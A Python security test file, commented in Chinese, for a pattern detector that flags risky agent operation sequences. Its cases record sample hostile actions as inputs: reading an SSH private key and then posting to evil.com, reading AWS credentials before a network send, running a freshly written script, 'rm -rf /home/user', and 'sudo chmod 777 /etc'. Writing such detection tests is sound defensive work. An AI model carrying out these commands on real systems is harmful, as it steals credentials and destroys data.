"""
模式检测器安全测试
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def test_pattern_detector():
    print("\n=== 模式检测器安全测试 ===")

    from castorice.security.pattern_detector import PatternDetector

    detector = PatternDetector(window_size=50)

    # 1. 记录正常操作
    detector.record("file_read", "/home/user/document.txt")
    detector.record("web_search", "python tutorial")
    assert detector.get_stats()["window_size"] == 2
    print("1. 正常操作记录 - PASS")

    # 2. 检测"敏感文件读取 + 网络外发"模式
    detector2 = PatternDetector(window_size=50)
    detector2.record("file_read", "/home/user/.ssh/id_rsa")  # 匹配 .ssh pattern
    detector2.record("network_send", "httpx.post('http://evil.com', data=...)")
    alerts = detector2.get_recent_alerts(limit=5)
    assert len(alerts) >= 1, "应检测到数据外泄模式"
    assert alerts[0]["pattern_name"] == "敏感文件读取 + 网络外发"
    print("2. 数据外泄模式检测 - PASS")

    # 3. 检测"脚本写入 + 立即执行"模式
    detector3 = PatternDetector(window_size=50)
    detector3.record("file_write", "/tmp/malicious.sh")
    detector3.record("shell_exec", "bash /tmp/malicious.sh")
    alerts = detector3.get_recent_alerts(limit=5)
    assert len(alerts) >= 1, "应检测到脚本激活模式"
    assert alerts[0]["pattern_name"] == "脚本写入 + 立即执行"
    print("3. 脚本激活模式检测 - PASS")

    # 4. 检测"高频小文件创建"模式
    detector4 = PatternDetector(window_size=50)
    for i in range(25):
        detector4.record("file_write", f"/tmp/spam{i}.txt")
    alerts = detector4.get_recent_alerts(limit=5)
    spam_alert = [a for a in alerts if "高频" in a.get("pattern_name", "")]
    assert len(spam_alert) >= 1, "应检测到高频创建模式"
    print("4. 高频文件创建检测 - PASS")

    # 5. 检测"删除系统关键文件"模式
    detector5 = PatternDetector(window_size=50)
    detector5.record("shell_exec", "rm -rf /home/user")
    alerts = detector5.get_recent_alerts(limit=5)
    del_alert = [a for a in alerts if "删除" in a.get("pattern_name", "")]
    assert len(del_alert) >= 1, "应检测到删除模式"
    print("5. 删除系统文件检测 - PASS")

    # 6. 检测"权限提升尝试"模式
    detector6 = PatternDetector(window_size=50)
    detector6.record("shell_exec", "sudo chmod 777 /etc")
    alerts = detector6.get_recent_alerts(limit=5)
    priv_alert = [a for a in alerts if "权限" in a.get("pattern_name", "")]
    assert len(priv_alert) >= 1, "应检测到权限提升模式"
    print("6. 权限提升检测 - PASS")

    # 7. 正常操作不产生告警
    detector7 = PatternDetector(window_size=50)
    detector7.record("file_read", "/home/user/doc.txt")
    detector7.record("file_read", "/home/user/notes.md")
    detector7.record("web_search", "weather today")
    alerts = detector7.get_recent_alerts(limit=5)
    assert len(alerts) == 0, "正常操作不应产生告警"
    print("7. 正常操作无告警 - PASS")

    # 8. 时间窗口过期检测（模拟过期）
    detector8 = PatternDetector(window_size=50)
    detector8.record("file_read", "/home/user/.aws/credentials")
    import time
    # 无法真正等待60秒，测试逻辑正确性即可
    detector8.record("network_send", "requests.post")
    alerts = detector8.get_recent_alerts()
    assert len(alerts) >= 1
    print("8. 窗口内模式检测 - PASS")

    # 9. 统计信息
    stats = detector.get_stats()
    assert "window_size" in stats
    assert "total_alerts" in stats
    print("9. 统计信息获取 - PASS")

    print(f"\n模式检测器安全测试完成，共 9 项测试通过！")


if __name__ == "__main__":
    test_pattern_detector()